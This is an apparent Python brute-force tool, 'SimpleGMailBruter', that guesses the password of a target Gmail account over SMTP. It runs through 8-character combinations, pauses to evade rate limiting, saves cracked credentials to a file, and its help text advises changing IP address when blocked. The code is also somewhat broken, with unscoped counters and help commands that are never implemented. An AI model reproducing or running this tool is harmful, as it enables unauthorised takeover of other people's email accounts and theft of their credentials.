import smtplib
import os
import sys
import time

Count = 0
_Count = 0

def Banner():
    Ban = "\n\t\t\t[>] SimpleGMailBruter [<]\n"
    print(Ban)

def GeneratePasswords():
    import itertools
    import string

    for combo in itertools.product(string.ascii_letters + string.digits, repeat=8):
        yield ''.join(combo)

def StartBruteAccount(account, SMTPServer, Time):
    for password in GeneratePasswords():
        try:
            SMTPServer.login(account, password)
            print("[+] Valid Password Has Been Found: {0}, For: {1}".format(password, account))

            # Create Data File
            with open('credits.txt', 'a') as DataFile:
                DataFile.write("\n--------------------------------------->")
                DataFile.write("[+] Email: {0}\n".format(account))
                DataFile.write("[+] Password: {0}\n".format(password))
                DataFile.write("--------------------------------------->")
                DataFile.close()
            exit()
        except smtplib.SMTPAuthenticationError:
            Count += 1
            _Count += 1
            if Count == 20:
                print("\n[!] Sleeping For {0} Seconds.".format(str(Time)))
                time.sleep(int(Time))
                Count = 0
                SMTPServer.close()
                SMTPServer = StartSMTPServiceForGmail()
            else:
                print("\rBad Password: {0}".format(password + "   "), end="")
                sys.stdout.flush()
        except Exception as e:
            if "please run connect() first" in str(e):
                SMTPServer.close()
                print("\nThe SMTP Server Disconnected. Please Run The Tool Again After Changing Your IP Address Or After Waiting Sometime")
                exit()
            else:
                print("Error: " + str(e))

def StartSMTPServiceForGmail():
    SMTPServer = smtplib.SMTP('smtp.gmail.com', 587)
    SMTPServer.ehlo()
    SMTPServer.starttls()
    return SMTPServer

def HelpGuide():
    print("\nHelp Guide For GmailBruterV2.")
    print("Commands For Shell:")
    print("\thelp\t\t--\tTo Show This Messages")
    print("\tset target\t--\tTo Set The Victim Email Address")
    print("\tset time\t--\tTo Set Time Between Every 10 Failed Passwords")
    print("\tshow target\t--\tTo Show You Current Target")
    print("\tshow time\t--\tTo Show You Current Time")
    print("\tload\t\t--\tLoad Local Config For Settings")
    print("\tstart\t\t--\tTo Start Brute Force Attack\n")
    print("\texit\t\t--\tClose The Shell")

def ContactMe():
    Gmail = "mdaif1332@gmail.com"  # Don't perform the brute-force attacks on my email.

def StartShell():
    # store how many times the user pressed Ctrl + C
    AbortCount = 0
    Commands = []
    Account = ''
    Time = ''
    with open(os.path.join("data", "Commands"), 'r') as CommandsFile:
        for Command in CommandsFile:
            Command = Command.rstrip("\n")
            Commands.append(Command)
    while True:
        # init variable to store user input
        ShellResponse = ''
        try:
            # get input from user
            ShellResponse = input("root@GmailBruter: ")

        # handle Ctrl + C
        except KeyboardInterrupt:
            # increment AbortCount
            AbortCount += 1
            # print \n to print the new shell line on the next line
            print()
            # if the user pressed Ctrl + C two times
            if AbortCount >= 2:
                # print hint
                print("[!] Press Ctrl + D or enter 'exit' to abort the program.")
                # reset abort count
                AbortCount = 0
            continue
        # handle Ctrl + D
        # Ctrl + D normally indicates the end of a file
        # this is why python throws an EOFError
        except EOFError:
            print()
            exit()

        if ShellResponse.lower().replace(' ', '') not in Commands:
            print("Can't find the command: '{0}'".format(ShellResponse))
        elif ShellResponse.lower() == "help":
            HelpGuide()
        elif ShellResponse.lower().replace(' ', '') == "settarget":
            Account = input("Target: ")
        elif ShellResponse.lower().replace(' ', '') == "settime":
            Time = input("Time: ")
        elif ShellResponse.lower() == "start":
            Service = StartSMTPServiceForGmail()
            if Account == '':
                print("[!] Set Target!")
                break
            elif Time == '':
                print("[!] Set Time!")
                break
            else:
                StartBruteAccount(Account, Service, Time)
        elif ShellResponse.lower() == "exit":
            exit()
        else:
            pass

# Start
Banner()
StartShell()
